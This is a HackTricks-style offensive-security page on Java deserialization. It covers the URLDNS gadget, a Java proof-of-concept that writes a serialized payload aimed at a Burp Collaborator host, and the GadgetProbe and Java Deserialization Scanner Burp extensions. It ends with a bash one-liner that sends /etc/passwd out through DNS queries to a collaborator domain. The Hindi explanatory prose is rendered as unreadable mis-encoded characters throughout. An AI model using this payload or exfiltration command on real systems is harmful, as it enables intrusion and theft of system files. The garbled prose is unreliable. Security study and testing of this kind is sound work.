# Java DNS Deserialization, GadgetProbe and Java Deserialization Scanner

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## DNS рдЕрдиреБрд░реЛрдз рдкрд░ рдбреЗрд╕рд┐рд░рд┐рдпрд▓рд╛рдЗрдЬреЗрд╢рди

рдХреНрд▓рд╛рд╕ `java.net.URL` `Serializable` рдХреЛ рд▓рд╛рдЧреВ рдХрд░рддрд╛ рд╣реИ, рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдпрд╣ рдХреНрд▓рд╛рд╕ рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
```java
public final class URL implements java.io.Serializable {
```
рдпрд╣ рдХреНрд▓рд╛рд╕ рдХрд╛ **рдЕрдЬреАрдм рд╡реНрдпрд╡рд╣рд╛рд░** рд╣реИред рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рд╕реЗ: тАЬ**рджреЛ рд╣реЛрд╕реНрдЯ рдХреЛ рд╕рдорд╛рди рдорд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИ рдпрджрд┐ рджреЛрдиреЛрдВ рд╣реЛрд╕реНрдЯ рдирд╛рдореЛрдВ рдХреЛ рд╕рдорд╛рди IP рдкрддреЛрдВ рдореЗрдВ рд╣рд▓ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ**редтАЭ\
рдлрд┐рд░, рд╣рд░ рдмрд╛рд░ рдЬрдм рдПрдХ URL рдСрдмреНрдЬреЗрдХреНрдЯ **`equals`** рдпрд╛ **`hashCode`** рдореЗрдВ рд╕реЗ **рдХрд┐рд╕реА рднреА** рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдХреЙрд▓ рдХрд░рддрд╛ рд╣реИ, рддреЛ **IP рдкрддрд╛** рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ **DNS рдЕрдиреБрд░реЛрдз** **рднреЗрдЬрд╛** рдЬрд╛рдПрдЧрд╛ред

**`hashCode`** рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдПрдХ **URL** рдСрдмреНрдЬреЗрдХреНрдЯ рд╕реЗ **рдХреЙрд▓ рдХрд░рдирд╛** рдХрд╛рдлреА рдЖрд╕рд╛рди рд╣реИ, рдмрд╕ рдЗрд╕ рдСрдмреНрдЬреЗрдХреНрдЯ рдХреЛ рдПрдХ `HashMap` рдореЗрдВ рдбрд╛рд▓рдирд╛ рдкрд░реНрдпрд╛рдкреНрдд рд╣реИ рдЬрд┐рд╕реЗ рдбреЗрд╕рд┐рд░рд┐рдпрд▓рд╛рдЗрдЬрд╝ рдХрд┐рдпрд╛ рдЬрд╛рдиреЗ рд╡рд╛рд▓рд╛ рд╣реИред рдЗрд╕рдХрд╛ рдХрд╛рд░рдг рдпрд╣ рд╣реИ рдХрд┐ **`readObject`** рдлрд╝рдВрдХреНрд╢рди рдХреЗ рдЕрдВрдд рдореЗрдВ `HashMap` рд╕реЗ рдпрд╣ рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрддрд╛ рд╣реИ:
```java
private void readObject(java.io.ObjectInputStream s)
throws IOException, ClassNotFoundException {
[   ...   ]
for (int i = 0; i < mappings; i++) {
[   ...   ]
putVal(hash(key), key, value, false, false);
}
```
рдпрд╣ **рдЪрд▓ рд░рд╣рд╛ рд╣реИ** `putVal` рдХреЛ `HashMap` рдХреЗ рдЕрдВрджрд░ рд╣рд░ рдорд╛рди рдХреЗ рд╕рд╛рде **рдирд┐рд╖реНрдкрд╛рджрд┐рдд** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред рд▓реЗрдХрд┐рди, рдЕрдзрд┐рдХ рдкреНрд░рд╛рд╕рдВрдЧрд┐рдХ рд╣реИ `hash` рдХреЛ рд╣рд░ рдорд╛рди рдХреЗ рд╕рд╛рде рдХреЙрд▓ рдХрд░рдирд╛ред рдпрд╣ `hash` рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдХреЛрдб рд╣реИ:
```java
static final int hash(Object key) {
int h;
return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);
}
```
рдЬреИрд╕рд╛ рдХрд┐ рдЖрдк рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ, **рдЬрдм рдбреАрд╕рд┐рд░рд┐рдпрд▓рд╛рдЗрдЬрд╝ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ** рдПрдХ **`HashMap`** рдХреЛ, рддреЛ рдлрд╝рдВрдХреНрд╢рди `hash` **рд╣рд░ рдСрдмреНрдЬреЗрдХреНрдЯ рдХреЗ рд╕рд╛рде** **рдирд┐рд╖реНрдкрд╛рджрд┐рдд** рд╣реЛрдиреЗ рдЬрд╛ рд░рд╣рд╛ рд╣реИ рдФрд░ **`hash`** рдирд┐рд╖реНрдкрд╛рджрди рдХреЗ **рджреМрд░рд╛рди** **рдпрд╣ рдСрдмреНрдЬреЗрдХреНрдЯ рдХрд╛ `.hashCode()` рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдЧрд╛**ред рдЗрд╕рд▓рд┐рдП, рдпрджрд┐ рдЖрдк **рдПрдХ `HashMap`** **рдЬрд┐рд╕рдореЗрдВ** рдПрдХ **URL** рдСрдмреНрдЬреЗрдХреНрдЯ рд╣реИ, **рдбреАрд╕рд┐рд░рд┐рдпрд▓рд╛рдЗрдЬрд╝** рдХрд░рддреЗ рд╣реИрдВ, рддреЛ **URL рдСрдмреНрдЬреЗрдХреНрдЯ** **`.hashCode()`** рдХреЛ **рдирд┐рд╖реНрдкрд╛рджрд┐рдд** рдХрд░реЗрдЧрд╛ред

рдЕрдм, рдЪрд▓рд┐рдП `URLObject.hashCode()` рдХреЗ рдХреЛрдб рдкрд░ рдирдЬрд╝рд░ рдбрд╛рд▓рддреЗ рд╣реИрдВ:
```java
public synchronized int hashCode() {
if (hashCode != -1)
return hashCode;

hashCode = handler.hashCode(this);
return hashCode;
```
рдЬреИрд╕рд╛ рдХрд┐ рдЖрдк рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ, рдЬрдм рдПрдХ `URLObject` `.hashCode()` рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рддрд╛ рд╣реИ, рддреЛ рдЗрд╕реЗ `hashCode(this)` рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИред рдЖрдЧреЗ рдЖрдк рдЗрд╕ рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдХреЛрдб рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ:
```java
protected int hashCode(URL u) {
int h = 0;

// Generate the protocol part.
String protocol = u.getProtocol();
if (protocol != null)
h += protocol.hashCode();

// Generate the host part.
InetAddress addr = getHostAddress(u);
[   ...   ]
```
рдЖрдк рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдПрдХ `getHostAddress` рдбреЛрдореЗрди рдкрд░ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, **DNS рдХреНрд╡реЗрд░реА рд▓реЙрдиреНрдЪ** рдХрд░ рд░рд╣рд╛ рд╣реИред

рдЗрд╕рд▓рд┐рдП, рдЗрд╕ рдХреНрд▓рд╛рд╕ рдХрд╛ **рджреБрд░реБрдкрдпреЛрдЧ** рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рддрд╛рдХрд┐ **DNS рдХреНрд╡реЗрд░реА рд▓реЙрдиреНрдЪ** рдХреА рдЬрд╛ рд╕рдХреЗ рдФрд░ **рджрд░реНрд╢рд╛рдиреЗ** рдХреЗ рд▓рд┐рдП рдХрд┐ **рдбрд┐рд╕реЗрд░рд┐рдпрд▓рд╛рдЗрдЬреЗрд╢рди** рд╕рдВрднрд╡ рд╣реИ, рдпрд╛ рдпрд╣рд╛рдВ рддрдХ рдХрд┐ **рдЬрд╛рдирдХрд╛рд░реА рдирд┐рдХрд╛рд▓рдиреЗ** рдХреЗ рд▓рд┐рдП (рдЖрдк рдПрдХ рдХрдорд╛рдВрдб рдирд┐рд╖реНрдкрд╛рджрди рдХреЗ рдЖрдЙрдЯрдкреБрдЯ рдХреЛ рдЙрдкрдбреЛрдореЗрди рдХреЗ рд░реВрдк рдореЗрдВ рдЬреЛрдбрд╝ рд╕рдХрддреЗ рд╣реИрдВ)ред

### URLDNS рдкреЗрд▓реЛрдб рдХреЛрдб рдЙрджрд╛рд╣рд░рдг

рдЖрдк [URDNS рдкреЗрд▓реЛрдб рдХреЛрдб ysoserial рд╕реЗ рдпрд╣рд╛рдБ рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java)ред рд╣рд╛рд▓рд╛рдБрдХрд┐, рдЗрд╕реЗ рдХреЛрдб рдХрд░рдирд╛ рд╕рдордЭрдиреЗ рдореЗрдВ рдЖрд╕рд╛рди рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдореИрдВрдиреЗ рдЕрдкрдирд╛ рдЦреБрдж рдХрд╛ PoC рдмрдирд╛рдпрд╛ (рдЬреЛ ysoserial рд╕реЗ рдЖрдзрд╛рд░рд┐рдд рд╣реИ):
```java
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.InetAddress;
import java.net.URLConnection;
import java.net.URLStreamHandler;
import java.util.HashMap;
import java.net.URL;

public class URLDNS {
public static void GeneratePayload(Object instance, String file)
throws Exception {
//Serialize the constructed payload and write it to the file
File f = new File(file);
ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f));
out.writeObject(instance);
out.flush();
out.close();
}
public static void payloadTest(String file) throws Exception {
//Read the written payload and deserialize it
ObjectInputStream in = new ObjectInputStream(new FileInputStream(file));
Object obj = in.readObject();
System.out.println(obj);
in.close();
}

public static void main(final String[] args) throws Exception {
String url = "http://3tx71wjbze3ihjqej2tjw7284zapye.burpcollaborator.net";
HashMap ht = new HashMap(); // HashMap that will contain the URL
URLStreamHandler handler = new SilentURLStreamHandler();
URL u = new URL(null, url, handler); // URL to use as the Key
ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.

// During the put above, the URL's hashCode is calculated and cached.
// This resets that so the next time hashCode is called a DNS lookup will be triggered.
final Field field = u.getClass().getDeclaredField("hashCode");
field.setAccessible(true);
field.set(u, -1);

//Test the payloads
GeneratePayload(ht, "C:\\Users\\Public\\payload.serial");
}
}


class SilentURLStreamHandler extends URLStreamHandler {

protected URLConnection openConnection(URL u) throws IOException {
return null;
}

protected synchronized InetAddress getHostAddress(URL u) {
return null;
}
}
```
### рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА

* [https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/](https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/)
* рдореВрд▓ рд╡рд┐рдЪрд╛рд░ рдореЗрдВ рдХреЙрдорди рдХрд▓реЗрдХреНрд╢рдВрд╕ рдкреЗрд▓реЛрдб рдХреЛ DNS рдХреНрд╡реЗрд░реА рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдмрджрд▓рд╛ рдЧрдпрд╛ рдерд╛, рдпрд╣ рдкреНрд░рд╕реНрддрд╛рд╡рд┐рдд рд╡рд┐рдзрд┐ рдХреА рддреБрд▓рдирд╛ рдореЗрдВ рдХрдо рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рдерд╛, рд▓реЗрдХрд┐рди рдпрд╣ рдкреЛрд╕реНрдЯ рд╣реИ: [https://www.gosecure.net/blog/2017/03/22/detecting-deserialization-bugs-with-dns-exfiltration/](https://www.gosecure.net/blog/2017/03/22/detecting-deserialization-bugs-with-dns-exfiltration/)

## GadgetProbe

рдЖрдк [**GadgetProbe**](https://github.com/BishopFox/GadgetProbe) рдХреЛ Burp Suite App Store (Extender) рд╕реЗ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

**GadgetProbe** рдпрд╣ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░реЗрдЧрд╛ рдХрд┐ рдХреНрдпрд╛ рдХреБрдЫ **Java рдХреНрд▓рд╛рд╕реЗрд╕ рдореМрдЬреВрдж рд╣реИрдВ** рд╕рд░реНрд╡рд░ рдХреА Java рдХреНрд▓рд╛рд╕ рдкрд░ рддрд╛рдХрд┐ рдЖрдк рдЬрд╛рди рд╕рдХреЗрдВ **рдХреНрдпрд╛** рдпрд╣ **рдХрд┐рд╕реА рдЬреНрдЮрд╛рдд рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ** рдХреЗ рд▓рд┐рдП **рд╕рдВрд╡реЗрджрдирд╢реАрд▓** рд╣реИред

### рдпрд╣ рдХреИрд╕реЗ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ

**GadgetProbe** рдкрд┐рдЫрд▓реЗ рдЕрдиреБрднрд╛рдЧ рдХреЗ рд╕рдорд╛рди **DNS рдкреЗрд▓реЛрдб** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдЧрд╛ рд▓реЗрдХрд┐рди **DNS рдХреНрд╡реЗрд░реА** рдЪрд▓рд╛рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рдпрд╣ **рдПрдХ рдордирдорд╛рдиреА рдХреНрд▓рд╛рд╕ рдХреЛ рдбреАрд╕рд┐рд░рд┐рдпрд▓рд╛рдЗрдЬрд╝ рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░реЗрдЧрд╛**ред рдпрджрд┐ **рдордирдорд╛рдиреА рдХреНрд▓рд╛рд╕ рдореМрдЬреВрдж рд╣реИ**, рддреЛ **DNS рдХреНрд╡реЗрд░реА** **рднреЗрдЬреА** рдЬрд╛рдПрдЧреА рдФрд░ GadgetProbe рдиреЛрдЯ рдХрд░реЗрдЧрд╛ рдХрд┐ рдпрд╣ рдХреНрд▓рд╛рд╕ рдореМрдЬреВрдж рд╣реИред рдпрджрд┐ **DNS** рдЕрдиреБрд░реЛрдз **рдХрднреА рдирд╣реАрдВ рднреЗрдЬрд╛ рдЧрдпрд╛**, рддреЛ рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ **рдордирдорд╛рдиреА рдХреНрд▓рд╛рд╕ рдХреЛ рд╕рдлрд▓рддрд╛рдкреВрд░реНрд╡рдХ рдбреАрд╕рд┐рд░рд┐рдпрд▓рд╛рдЗрдЬрд╝ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЧрдпрд╛** рдЗрд╕рд▓рд┐рдП рдпрд╛ рддреЛ рдпрд╣ рдореМрдЬреВрдж рдирд╣реАрдВ рд╣реИ рдпрд╛ рдпрд╣ **рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрдмрд▓/рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯреЗрдмрд▓** рдирд╣реАрдВ рд╣реИред

рдЧрд┐рдЯрд╣рдм рдХреЗ рдЕрдВрджрд░, [**GadgetProbe рдореЗрдВ рдХреБрдЫ рд╡рд░реНрдбрд▓рд┐рд╕реНрдЯ рд╣реИрдВ**](https://github.com/BishopFox/GadgetProbe/tree/master/wordlists) рдЬрд┐рдирдореЗрдВ рдкрд░реАрдХреНрд╖рдг рдХреЗ рд▓рд┐рдП Java рдХреНрд▓рд╛рд╕реЗрд╕ рд╣реИрдВред

![https://github.com/BishopFox/GadgetProbe/blob/master/assets/intruder4.gif](<../../.gitbook/assets/intruder4 (1) (1).gif>)

### рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА

* [https://know.bishopfox.com/research/gadgetprobe](https://know.bishopfox.com/research/gadgetprobe)

## Java Deserialization Scanner

рдпрд╣ рд╕реНрдХреИрдирд░ Burp App Store (**Extender**) рд╕реЗ **рдбрд╛рдЙрдирд▓реЛрдб** рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред\
**рдПрдХреНрд╕рдЯреЗрдВрд╢рди** рдореЗрдВ **рдкреИрд╕рд┐рд╡** рдФрд░ рд╕рдХреНрд░рд┐рдп **рдХреНрд╖рдорддрд╛рдПрдБ** рд╣реИрдВред

### рдкреИрд╕рд┐рд╡

рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдпрд╣ **рдкреИрд╕рд┐рд╡рд▓реА** рд╕рднреА рдЕрдиреБрд░реЛрдзреЛрдВ рдФрд░ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░рддрд╛ рд╣реИ **Java рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬреНрдб рдореИрдЬрд┐рдХ рдмрд╛рдЗрдЯреНрд╕** рдХреА рддрд▓рд╛рд╢ рдореЗрдВ рдФрд░ рдпрджрд┐ рдХреЛрдИ рдкрд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддреЛ рдПрдХ рд╕рдВрд╡реЗрджрдирд╢реАрд▓рддрд╛ рдЪреЗрддрд╛рд╡рдиреА рдкреНрд░рд╕реНрддреБрдд рдХрд░реЗрдЧрд╛:

![https://techblog.mediaservice.net/2017/05/reliable-discovery-and-exploitation-of-java-deserialization-vulnerabilities/](<../../.gitbook/assets/image (765).png>)

### рд╕рдХреНрд░рд┐рдп

**рдореИрдиреБрдЕрд▓ рдкрд░реАрдХреНрд╖рдг**

рдЖрдк рдПрдХ рдЕрдиреБрд░реЛрдз рдХрд╛ рдЪрдпрди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рд░рд╛рдЗрдЯ-рдХреНрд▓рд┐рдХ рдХрд░реЗрдВ рдФрд░ `Send request to DS - Manual Testing` рдЪреБрдиреЗрдВред\
рдлрд┐рд░, _Deserialization Scanner Tab_ --> _Manual testing tab_ рдХреЗ рдЕрдВрджрд░ рдЖрдк **рдЗрдВрд╕рд░реНрд╢рди рдкреЙрдЗрдВрдЯ** рдХрд╛ рдЪрдпрди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдФрд░ **рдкрд░реАрдХреНрд╖рдг рд╢реБрд░реВ рдХрд░реЗрдВ** (рдЙрдкрдпреБрдХреНрдд рд╣рдорд▓реЗ рдХрд╛ рдЪрдпрди рдХрд░реЗрдВ рдЬреЛ рдЙрдкрдпреЛрдЧ рдХреА рдЧрдИ рдПрдиреНрдХреЛрдбрд┐рдВрдЧ рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рд╣реЛ)ред

![https://techblog.mediaservice.net/2017/05/reliable-discovery-and-exploitation-of-java-deserialization-vulnerabilities/](../../.gitbook/assets/3-1.png)

рд╣рд╛рд▓рд╛рдВрдХрд┐ рдЗрд╕реЗ "рдореИрдиреБрдЕрд▓ рдкрд░реАрдХреНрд╖рдг" рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИ, рдпрд╣ рдХрд╛рдлреА **рд╕реНрд╡рдЪрд╛рд▓рд┐рдд** рд╣реИред рдпрд╣ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рдЬрд╛рдВрдЪ рдХрд░реЗрдЧрд╛ рдХрд┐ **рдбрд┐рд╕рд┐рд░рд┐рдпрд▓рд╛рдЗрдЬреЗрд╢рди** **рдХрд┐рд╕реА рднреА ysoserial рдкреЗрд▓реЛрдб** рдХреЗ рд▓рд┐рдП **рд╕рдВрд╡реЗрджрдирд╢реАрд▓** рд╣реИ рдпрд╛ рдирд╣реАрдВ, рд╡реЗрдм рд╕рд░реНрд╡рд░ рдкрд░ рдореМрдЬреВрдж рдкреБрд╕реНрддрдХрд╛рд▓рдпреЛрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░рдХреЗ рдФрд░ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╡рд╛рд▓реЗ рдХреЛ рд╣рд╛рдЗрд▓рд╛рдЗрдЯ рдХрд░реЗрдЧрд╛ред **рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдкреБрд╕реНрддрдХрд╛рд▓рдпреЛрдВ** рдХреА **рдЬрд╛рдВрдЪ** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк **Javas Sleeps**, **CPU** рдЦрдкрдд рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ **sleeps**, рдпрд╛ рдкрд╣рд▓реЗ рдЙрд▓реНрд▓реЗрдЦрд┐рдд **DNS** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХрд╛ рдЪрдпрди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

**рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯрд┐рдВрдЧ**

рдПрдХ рдмрд╛рд░ рдЬрдм рдЖрдк рдПрдХ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдкреБрд╕реНрддрдХрд╛рд▓рдп рдХреА рдкрд╣рдЪрд╛рди рдХрд░ рд▓реЗрддреЗ рд╣реИрдВ, рддреЛ рдЖрдк рдЕрдиреБрд░реЛрдз рдХреЛ _Exploiting Tab_ рдореЗрдВ рднреЗрдЬ рд╕рдХрддреЗ рд╣реИрдВред\
рдЗрд╕ рдЯреИрдм рдореЗрдВ рдЖрдкрдХреЛ рдлрд┐рд░ рд╕реЗ **рдЗрдВрдЬреЗрдХреНрд╢рди рдкреЙрдЗрдВрдЯ** рдХрд╛ **рдЪрдпрди** рдХрд░рдирд╛ рд╣реЛрдЧрд╛, рдФрд░ **рдкреЗрд▓реЛрдб** рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП **рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдкреБрд╕реНрддрдХрд╛рд▓рдп** рдФрд░ **рдХрдорд╛рдВрдб** рд▓рд┐рдЦрдирд╛ рд╣реЛрдЧрд╛ред рдлрд┐рд░, рдмрд╕ рдЙрдкрдпреБрдХреНрдд **рд╣рдорд▓рд╛** рдмрдЯрди рджрдмрд╛рдПрдВред

![https://techblog.mediaservice.net/2017/05/reliable-discovery-and-exploitation-of-java-deserialization-vulnerabilities/](../../.gitbook/assets/4.png)

### Java Deserialization DNS Exfil рдЬрд╛рдирдХрд╛рд░реА

рдЕрдкрдиреЗ рдкреЗрд▓реЛрдб рдХреЛ рдХреБрдЫ рдЗрд╕ рддрд░рд╣ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдВ:
```bash
(i=0;tar zcf - /etc/passwd | xxd -p -c 31 | while read line; do host $line.$i.cl1k22spvdzcxdenxt5onx5id9je73.burpcollaborator.net;i=$((i+1)); done)
```
### рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА

* [https://techblog.mediaservice.net/2017/05/reliable-discovery-and-exploitation-of-java-deserialization-vulnerabilities/](https://techblog.mediaservice.net/2017/05/reliable-discovery-and-exploitation-of-java-deserialization-vulnerabilities/)

{% hint style="success" %}
рд╕реАрдЦреЗрдВ рдФрд░ AWS рд╣реИрдХрд┐рдВрдЧ рдХрд╛ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
рд╕реАрдЦреЗрдВ рдФрд░ GCP рд╣реИрдХрд┐рдВрдЧ рдХрд╛ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ</summary>

* [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдБ**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* **рд╣рдорд╛рд░реЗ** ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**telegram рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ рдпрд╛ **Twitter** ЁЯРж рдкрд░ рд╣рдореЗрдВ **рдлреЙрд▓реЛ рдХрд░реЗрдВ** [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рдФрд░** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдЧрд┐рдЯрд╣рдм рд░рд┐рдкреЛрдЬрд┐рдЯрд░реА рдореЗрдВ PR рд╕рдмрдорд┐рдЯ рдХрд░реЗрдВред

</details>
{% endhint %}
